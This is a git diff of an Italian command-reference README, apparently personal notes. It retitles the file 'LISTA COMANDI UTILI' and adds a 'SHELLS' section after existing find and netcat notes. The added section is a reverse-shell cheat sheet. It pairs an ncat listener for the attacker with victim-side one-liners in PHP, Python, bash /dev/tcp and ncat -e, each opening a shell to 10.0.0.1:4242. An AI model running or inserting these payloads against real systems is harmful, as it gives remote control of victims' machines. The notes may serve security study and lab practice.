@@ -1,4 +1,4 @@
-# vdsi
+# LISTA COMANDI UTILI
 `find`: è il comando usato per trovare un file seguendo certi criteri
 	- `find /`: inizia a cercare da root
 	- `-user user1`: cerca file creato da utente user1
@@ -27,5 +27,32 @@
 	- `nc 127.0.0.1 1234`: connettiti alla macchina con indirizzo 127.0.0.1 alla porta 1234
 
 
+#SHELLS
+###Reverse shell
+Nella reverse shell è l'attacker che si mette in listening e la vittima si collega, quindi
+ATTACCANTE:
+
+```
+ncat -lvnp 4242
+```
+
+VITTIMA:
+
+#php
+```php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("sh <&3 >&3 2>&3");'```
+
+#python3
+```python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'```
+
+#bash
+
+```bash -i >& /dev/tcp/10.0.0.1/4242 0>&1```
+
+```0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196```
+
+```/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1```
+
+#netcat
+```ncat 10.0.0.1 4242 -e /bin/bash```
 
 
